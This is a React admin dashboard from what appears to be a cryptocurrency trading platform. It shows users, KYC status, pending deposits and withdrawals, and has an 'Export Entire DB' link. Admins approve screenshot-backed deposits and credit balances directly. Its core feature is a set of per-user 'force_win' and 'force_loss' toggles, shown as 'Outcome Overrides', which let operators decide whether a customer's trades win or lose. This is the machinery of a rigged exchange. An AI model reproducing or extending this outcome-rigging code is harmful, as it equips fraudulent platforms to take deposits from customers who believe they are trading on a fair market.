import { useEffect, useState, useCallback } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { Link } from 'react-router-dom';
import { useAuth } from '@/hooks/useAuth';
import { getAdminIdForCurrentUser, filterUsersByAdminGroup, syncUserReferralsWithSupabase } from '@/lib/adminPermissions';
import { CryptoIcon } from '@/components/shared/CryptoIcon';
import {
  Users, ShieldCheck, Wallet, Activity, TrendingUp, RefreshCw, AlertCircle,
  Check, X, Database, Download
} from 'lucide-react';
import CubeSpinner from '@/components/shared/CubeSpinner';

interface ProfileRow {
  id: string;
  username: string | null;
  email: string | null;
  balance: number | null;
  futures_balance: number | null;
  staked_balance: number | null;
  kyc_status: string | null;
  force_win: boolean | null;
  force_loss: boolean | null;
  created_at: string;
}

interface DepositRow {
  id: string;
  user_id: string;
  asset: string;
  network: string;
  amount: number;
  status: string;
  screenshot_url?: string;
}

const AdminDashboard = () => {
  const { user: currentUser } = useAuth();
  const [profiles, setProfiles] = useState<ProfileRow[]>([]);
  const [deposits, setDeposits] = useState<DepositRow[]>([]);
  const [walletCount, setWalletCount] = useState(0);
  const [pendingWithdrawals, setPendingWithdrawals] = useState(0);
  const [loading, setLoading] = useState(true);
  const [loadingDeposits, setLoadingDeposits] = useState(false);
  const [confirmDeposit, setConfirmDeposit] = useState<{ id: string; action: 'APPROVED' | 'REJECTED'; amount: number; asset: string; userId: string } | null>(null);
  const [error, setError] = useState<string | null>(null);

  const loadData = useCallback(async (silent = false) => {
    if (!silent) setLoading(true);
    setError(null);
    try {
      const [
        { data: p, error: pe }, 
        { data: d, error: de }, 
        { data: w, error: we }, 
        { data: wl, error: wle }
      ] = await Promise.all([
        supabase.from('profiles').select('*').order('created_at', { ascending: false }),
        supabase.from('deposits').select('*').eq('status', 'PENDING').order('created_at', { ascending: false }),
        supabase.from('admin_wallets').select('id'),
        supabase.from('withdrawals').select('*').eq('status', 'PENDING'),
      ]);

      if (pe) throw pe;
      if (de) throw de;
      if (we) throw we;
      if (wle) throw wle;

      await syncUserReferralsWithSupabase();

      const adminId = getAdminIdForCurrentUser(currentUser?.email);
      const filteredP = filterUsersByAdminGroup(p || [], adminId);
      const filteredD = filterUsersByAdminGroup(d || [], adminId);
      const filteredWL = filterUsersByAdminGroup(wl || [], adminId);

      setProfiles(filteredP);
      setDeposits(filteredD);
      setWalletCount(w?.length || 0);
      setPendingWithdrawals(filteredWL.length);
    } catch (err: any) {
      console.error("Dashboard data load failed:", err);
      setError(err.message || "Failed to load admin data. Please check your permissions.");
    } finally {
      if (!silent) setLoading(false);
    }
  }, []);

  useEffect(() => { 
    loadData(); 
  }, [loadData]);

  const handleDepositAction = async () => {
    if (!confirmDeposit) return;
    const { id, action, amount, asset, userId } = confirmDeposit;
    
    console.log(`[AdminDashboard] Starting ${action} for deposit ${id} (User: ${userId}, Amount: ${amount} ${asset})`);
    setLoadingDeposits(true);
    try {
      // 1. Update deposit status first
      const { error: updateError } = await supabase.from('deposits').update({ status: action }).eq('id', id);
      if (updateError) {
        console.error("[AdminDashboard] Supabase updateError (deposits):", updateError);
        throw updateError;
      }
      
      // Update local state immediately so it disappears from UI
      setDeposits(prev => prev.filter(d => d.id !== id));
      
      // 2. If approved, credit user balance
      if (action === 'APPROVED') {
        const depositAmt = Number(amount);
        if (isNaN(depositAmt)) throw new Error("Invalid deposit amount");

        if (asset === 'USDT') {
          console.log(`[AdminDashboard] Crediting USDT balance...`);
          const { data: profile, error: pError } = await supabase.from('profiles').select('balance').eq('id', userId).single();
          if (pError) {
            console.error("[AdminDashboard] Supabase pError (profiles select):", pError);
            throw pError;
          }
          if (!profile) throw new Error("User profile not found");
          
          const currentBalance = Number(profile.balance ?? 0);
          const newBalance = currentBalance + depositAmt;
          
          console.log(`[AdminDashboard] Updating balance from ${currentBalance} to ${newBalance}`);
          const { error: balanceError } = await supabase.from('profiles').update({ balance: newBalance }).eq('id', userId);
          if (balanceError) {
            console.error("[AdminDashboard] Supabase balanceError (profiles update):", balanceError);
            throw balanceError;
          }
          
          setProfiles(prev => prev.map(p => p.id === userId ? { ...p, balance: newBalance } : p));
        } else {
          console.log(`[AdminDashboard] Crediting ${asset} to user_assets...`);
          const { data: assets, error: aError } = await supabase
            .from('user_assets')
            .select('*')
            .eq('user_id', userId)
            .eq('symbol', asset);
          
          if (aError) {
            console.error("[AdminDashboard] Supabase aError (user_assets select):", aError);
            throw aError;
          }
          
          const assetRow = assets?.[0];

          if (assetRow) {
            const currentAmount = Number(assetRow.amount ?? 0);
            const { error: assetUpdateError } = await supabase.from('user_assets').update({
              amount: currentAmount + depositAmt
            }).eq('id', assetRow.id);
            if (assetUpdateError) throw assetUpdateError;
          } else {
            const { error: assetInsertError } = await supabase.from('user_assets').insert({
              user_id: userId,
              symbol: asset,
              amount: depositAmt
            });
            if (assetInsertError) throw assetInsertError;
          }
        }
      }
      
      setConfirmDeposit(null);
      await loadData(true);
    } catch (err: any) {
      console.error("[AdminDashboard] Action failed:", err);
      // Fallback: If for some reason alert is blocked, we still log it.
      setError("Operation failed: " + (err.message || "Unknown error"));
    } finally {
      setLoadingDeposits(false);
    }
  };

  const handleSetOutcome = async (profile: ProfileRow, outcome: 'win' | 'loss' | 'normal', e?: React.MouseEvent) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }
    
    let updates = {};
    if (outcome === 'win') {
      updates = { force_win: true, force_loss: false };
    } else if (outcome === 'loss') {
      updates = { force_win: true, force_loss: true };
    } else {
      updates = { force_win: false, force_loss: false };
    }
    
    // Explicitly check for changes before updating to avoid unnecessary re-renders or potential loops
    if (profile.force_win === (updates as any).force_win && profile.force_loss === (updates as any).force_loss) return;
    
    setProfiles(prev => prev.map(p => p.id === profile.id ? { ...p, ...updates } : p));
    
    try {
      const { error: updateError } = await supabase.from('profiles').update(updates).eq('id', profile.id);
      if (updateError) throw updateError;
    } catch (err: any) {
      console.error("Update failed:", err);
      loadData(true);
    }
  };

  const handleToggleOverride = async (profile: ProfileRow, e: React.MouseEvent) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }
    
    // Outcome Logic:
    // If turning ON: Force Win = true, Force Loss = false
    // If turning OFF: Force Win = false, Force Loss = false
    const isCurrentlyOff = !profile.force_win;
    const updates = { 
      force_win: isCurrentlyOff,
      force_loss: false 
    };

    if (profile.force_win === isCurrentlyOff) return;

    setProfiles(prev => prev.map(p => p.id === profile.id ? { ...p, ...updates } : p));
    
    try {
      const { error: updateError } = await supabase.from('profiles').update(updates).eq('id', profile.id);
      if (updateError) throw updateError;
    } catch (err: any) {
      console.error("Toggle error:", err);
      loadData(true);
    }
  };

  const totalUsers = profiles.length;
  const pendingKYC = profiles.filter(p => p.kyc_status === 'PENDING');
  const forcedOutcomeUsers = profiles.filter(p => p.force_win || p.force_loss);
  const newestUsers = profiles.slice(0, 5);

  if (loading) return <CubeSpinner fullScreen label="Gathering platform metrics..." />;

  if (error) {
    return (
      <div className="h-[80vh] flex flex-col items-center justify-center p-6 text-center">
        <div className="w-16 h-16 rounded-full bg-destructive/10 text-destructive flex items-center justify-center mb-4">
          <AlertCircle size={32} />
        </div>
        <h2 className="text-xl font-black text-foreground mb-2">Access Restricted or Error</h2>
        <p className="text-muted-foreground mb-6 max-w-md">{error}</p>
        <button 
          onClick={() => loadData()}
          className="px-6 py-3 bg-primary text-primary-foreground font-bold rounded-2xl shadow-lg shadow-primary/20 hover:scale-105 active:scale-95 transition-all flex items-center gap-2"
        >
          <RefreshCw size={18} />
          Try Again
        </button>
      </div>
    );
  }

  return (
    <div className="p-6 lg:p-10 space-y-8 max-w-[1600px] mx-auto">
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-4">
        <div>
          <p className="text-[10px] font-black text-primary uppercase tracking-[0.3em] mb-1">Infrastructure Control</p>
          <h1 className="text-4xl font-black text-foreground tracking-tight">Admin Dashboard</h1>
        </div>
        <div className="flex items-center gap-3">
          <Link
            to="/admin/database-export"
            className="flex items-center gap-2 px-4 py-2 bg-primary/10 border border-primary/20 rounded-xl text-sm font-bold text-primary hover:bg-primary hover:text-primary-foreground transition-all shadow-sm"
          >
            <Database size={16} />
            Export Entire DB
          </Link>
          <button 
            onClick={() => loadData()} 
            className="group flex items-center gap-2 px-4 py-2 bg-card border border-border rounded-xl text-sm font-bold text-muted-foreground hover:text-primary hover:border-primary/30 transition-all shadow-sm"
          >
            <RefreshCw size={16} className="group-hover:rotate-180 transition-transform duration-500" />
            Live Refresh
          </button>
        </div>
      </div>

      {/* Stats Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
        <StatCard title="Total Users" value={totalUsers.toString()} icon={Users} className="bg-primary/10 text-primary border-primary/20" />
        <StatCard title="Pending KYC" value={pendingKYC.length.toString()} icon={ShieldCheck} className="bg-orange-500/10 text-orange-500 border-orange-500/20" />
        <StatCard title="Active Wallets" value={`${walletCount}/9`} icon={Wallet} className={walletCount >= 9 ? "bg-emerald-500/10 text-emerald-500 border-emerald-500/20" : "bg-yellow-500/10 text-yellow-500 border-yellow-500/20"} />
        <Link to="/admin/deposit-requests" className="block transform transition-transform hover:scale-[1.02] active:scale-98">
          <StatCard title="Pending Deposits" value={deposits.length.toString()} icon={Activity} className="bg-purple-500/10 text-purple-500 border-purple-500/20" />
        </Link>
        <Link to="/admin/withdrawals" className="block transform transition-transform hover:scale-[1.02] active:scale-98">
          <StatCard title="Pending Payouts" value={pendingWithdrawals.toString()} icon={TrendingUp} className="bg-destructive/10 text-destructive border-destructive/20" />
        </Link>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-2 gap-8">
        <div className="space-y-8">
          {/* Active Overrides */}
          <div className="bg-card rounded-3xl border border-border overflow-hidden shadow-sm">
            <div className="px-8 py-5 border-b border-border flex justify-between items-center bg-muted/30">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-emerald-500/10 text-emerald-500 flex items-center justify-center">
                  <TrendingUp size={20} />
                </div>
                <h3 className="font-black text-foreground uppercase tracking-wider text-sm">Outcome Overrides</h3>
              </div>
              <span className="text-[10px] font-black bg-emerald-500 text-white px-2 py-0.5 rounded-full">{forcedOutcomeUsers.length}</span>
            </div>
            
            <div className="divide-y divide-border">
              {forcedOutcomeUsers.length === 0 ? (
                <div className="p-12 text-center text-muted-foreground text-sm opacity-50 italic">No manual trade overrides active.</div>
              ) : (
                forcedOutcomeUsers.slice(0, 5).map(u => (
                  <div key={u.id} className="px-8 py-4 flex items-center justify-between hover:bg-muted/10 transition-colors">
                    <div className="flex items-center gap-3">
                      <div className={`w-10 h-10 rounded-xl flex items-center justify-center font-black text-xs ${u.force_win ? 'bg-emerald-500/10 text-emerald-600' : u.force_loss ? 'bg-rose-500/10 text-rose-600' : 'bg-primary/10 text-primary'}`}>
                        {(u.username || 'U').charAt(0).toUpperCase()}
                      </div>
                      <div>
                        <div className="font-black text-sm text-foreground">{u.username || 'Anonymous'}</div>
                        <div className={`text-[10px] font-bold uppercase tracking-tight ${u.force_win && !u.force_loss ? 'text-emerald-500' : u.force_win && u.force_loss ? 'text-rose-500' : 'text-muted-foreground'}`}>
                          {u.force_win ? (u.force_loss ? 'LOSS FORCED' : 'WIN FORCED') : 'NORMAL'}
                        </div>
                      </div>
                    </div>
                    {/* Quick Toggle - Toggles between Win Forced and Normal */}
                    <button
                      type="button"
                      onMouseDown={(e) => e.stopPropagation()}
                      onClick={(e) => handleToggleOverride(u, e)}
                      className={`relative inline-flex h-5 w-9 items-center rounded-full transition-colors ${u.force_win ? 'bg-primary' : 'bg-muted'}`}
                    >
                      <span className={`inline-block h-3 w-3 transform rounded-full bg-white transition-transform ${u.force_win ? 'translate-x-5' : 'translate-x-1'}`} />
                    </button>
                  </div>
                )
              ))}
            </div>
            <Link to="/admin/futures" className="flex items-center justify-center py-4 bg-muted/20 text-[10px] font-black text-primary uppercase tracking-[0.2em] hover:bg-primary hover:text-white transition-all">
              Manage Overrides
            </Link>
          </div>

          {/* Newest Users Flow */}
          <div className="bg-card rounded-3xl border border-border overflow-hidden shadow-sm">
            <div className="px-8 py-5 border-b border-border">
              <h3 className="font-black text-foreground uppercase tracking-widest text-xs opacity-70">Infrastructure Onboarding</h3>
            </div>
            <div className="divide-y divide-border">
              {newestUsers.map(user => (
                <div key={user.id} className="px-8 py-4 flex justify-between items-center hover:bg-muted/10 transition-colors">
                  <div>
                    <div className="text-sm font-black text-foreground">{user.username || 'New User'}</div>
                    <div className="text-[10px] text-muted-foreground font-bold uppercase tracking-tighter">{new Date(user.created_at).toLocaleDateString()}</div>
                  </div>
                  <span className={`px-2 py-0.5 rounded text-[9px] font-black border ${
                    user.kyc_status === 'VERIFIED' ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/20' : 'bg-muted text-muted-foreground border-border'
                  }`}>
                    {user.kyc_status || 'UNVERIFIED'}
                  </span>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="space-y-8">
          {/* Pending Deposits List */}
          <div className="bg-card rounded-3xl border border-border overflow-hidden shadow-sm">
            <div className="px-8 py-5 border-b border-border flex justify-between items-center bg-muted/30">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-purple-500/10 text-purple-500 flex items-center justify-center">
                  <Activity size={20} />
                </div>
                <h3 className="font-black text-foreground uppercase tracking-wider text-sm">Deposit Queue</h3>
              </div>
              <span className="text-[10px] font-black bg-purple-500 text-white px-2 py-0.5 rounded-full">{deposits.length}</span>
            </div>
            
            <div className="divide-y divide-border">
              {deposits.length === 0 ? (
                <div className="p-12 text-center text-muted-foreground text-sm opacity-50 italic">No pending deposits in queue.</div>
              ) : (
                deposits.slice(0, 5).map(dep => (
                  <div key={dep.id} className="px-8 py-4 flex items-center justify-between hover:bg-muted/10 transition-colors">
                    <div className="flex items-center gap-4">
                      <CryptoIcon symbol={dep.asset} size={32} />
                      <div>
                        <div className="font-black text-sm text-foreground">{dep.amount} {dep.asset}</div>
                        <div className="text-[10px] font-bold text-muted-foreground uppercase">{dep.network}</div>
                      </div>
                      {dep.screenshot_url && (
                        <div 
                          className="w-10 h-10 rounded border border-border bg-muted overflow-hidden cursor-pointer hover:opacity-80 transition-opacity"
                          onClick={() => window.open(dep.screenshot_url, '_blank')}
                          title="View Payment Proof"
                        >
                          <img src={dep.screenshot_url} alt="Proof" className="w-full h-full object-cover" />
                        </div>
                      )}
                    </div>
                    <div className="flex gap-2">
                      <button 
                        onClick={() => {
                          console.log("Reject clicked for deposit:", dep.id);
                          setConfirmDeposit({ id: dep.id, action: 'REJECTED', amount: dep.amount, asset: dep.asset, userId: dep.user_id });
                        }}
                        className="p-3 text-rose-500 hover:bg-rose-500/10 rounded-xl transition-all active:scale-90"
                      >
                        <X size={18} />
                      </button>
                      <button 
                        onClick={() => {
                          console.log("Approve clicked for deposit:", dep.id);
                          setConfirmDeposit({ id: dep.id, action: 'APPROVED', amount: dep.amount, asset: dep.asset, userId: dep.user_id });
                        }}
                        className="p-3 text-emerald-500 hover:bg-emerald-500/10 rounded-xl transition-all active:scale-90"
                      >
                        <Check size={18} />
                      </button>
                    </div>
                  </div>
                )
              ))}
            </div>
            <Link to="/admin/deposit-requests" className="flex items-center justify-center py-4 bg-muted/20 text-[10px] font-black text-primary uppercase tracking-[0.2em] hover:bg-primary hover:text-white transition-all">
              Manage Deposits
            </Link>
          </div>
        </div>
      </div>

      {/* Confirm Deposit Modal Overlay */}
      {confirmDeposit && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-background/80 backdrop-blur-sm">
          <div className="bg-card border border-border rounded-3xl p-8 max-w-sm w-full shadow-2xl animate-in zoom-in-95 duration-200">
            <div className={`w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center ${confirmDeposit.action === 'APPROVED' ? 'bg-emerald-500/10 text-emerald-500' : 'bg-rose-500/10 text-rose-500'}`}>
              {confirmDeposit.action === 'APPROVED' ? <Check size={32} /> : <X size={32} />}
            </div>
            <h3 className="text-xl font-bold text-foreground text-center mb-2">Confirm {confirmDeposit.action}</h3>
            <p className="text-muted-foreground text-center text-sm mb-6 uppercase font-bold tracking-tighter">
              {confirmDeposit.amount} {confirmDeposit.asset}
            </p>
            <div className="flex gap-3">
              <button onClick={() => setConfirmDeposit(null)} className="flex-1 py-3 rounded-2xl font-bold text-muted-foreground hover:bg-muted transition-all">Cancel</button>
              <button 
                onClick={handleDepositAction}
                disabled={loadingDeposits}
                className={`flex-1 py-3 rounded-2xl font-bold text-white shadow-xl transition-all ${
                  confirmDeposit.action === 'APPROVED' ? 'bg-emerald-500 shadow-emerald-500/20 hover:bg-emerald-600' : 'bg-rose-500 shadow-rose-500/20 hover:bg-rose-600'
                }`}
              >
                {loadingDeposits ? '...' : 'Confirm'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const StatCard = ({ title, value, icon: Icon, className }: { title: string; value: string; icon: any; className: string }) => (
  <div className="bg-card rounded-3xl p-6 border border-border flex items-center gap-5 shadow-sm transition-all hover:shadow-md hover:border-primary/20">
    <div className={`w-14 h-14 rounded-2xl flex items-center justify-center border ${className}`}>
      <Icon size={24} />
    </div>
    <div>
      <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest mb-1 opacity-60">{title}</p>
      <h4 className="text-3xl font-black text-foreground tracking-tighter">{value}</h4>
    </div>
  </div>
);

export default AdminDashboard;
